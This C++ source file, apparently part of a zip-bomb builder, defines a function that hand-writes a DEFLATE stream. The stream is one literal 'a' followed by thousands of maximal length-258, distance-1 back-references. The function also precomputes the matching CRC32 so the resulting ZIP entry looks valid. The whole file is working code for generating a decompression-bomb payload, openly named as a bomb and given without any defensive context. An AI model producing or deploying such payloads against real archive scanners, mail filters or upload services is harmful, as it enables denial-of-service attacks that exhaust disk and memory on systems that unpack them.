//
// Created by LeeEeZian on 30/9/2026.
//
#include "factory/PayloadFactory.h"
#include "deflation/lz77.h"
#include "deflation/BitWriter.h"
#include "zip_file_construction/LocalFileHeader.h"

DeflateResult payloadFactory::createFixedBombPayload(const size_t size) {
    using namespace lz77;
    BitWriter writer;
    writer.add(HuffmanTable::BFINAL::YES, 1);
    writer.add(HuffmanTable::BTYPE::FIXED_HUFFMAN, 2);

    auto [code, length] {HuffmanTable::fixedSymbolTable('a')};
    writer.add(code, length);

    const MatchCode lengthCode{lz77::getLengthCode(static_cast<int>(lz77::LengthValue::MAX))};
    const MatchCode distanceCode{lz77::getDistanceCode(1)};

    for (size_t i {}; i < 4 * size; ++i) {
        auto [lCode, lLength] {HuffmanTable::fixedSymbolTable(lengthCode.symbol)};
        writer.add(lCode, lLength);
        writer.add(lengthCode.extraValue, lengthCode.extraBit);

        auto [dCode, dLength] {HuffmanTable::fixedDistanceTable(distanceCode.symbol)};
        writer.add(dCode, dLength);
        writer.add(distanceCode.extraValue, distanceCode.extraBit);
    }

    auto [endCode, endLength] {HuffmanTable::fixedSymbolTable(256)};
    writer.add(endCode, endLength);
    const size_t repeatedData{4*size*258};

    const size_t uncompressedSize{repeatedData+1};

    Crc32 BombCrc32{};

    for (int i {} ; i < uncompressedSize; ++i) {
        BombCrc32.update('a');
    }
    BombCrc32.finalize();

    return {.data = writer.release(),.uncompressedSize = uncompressedSize,.crc32 = BombCrc32.getCrc32()};
}
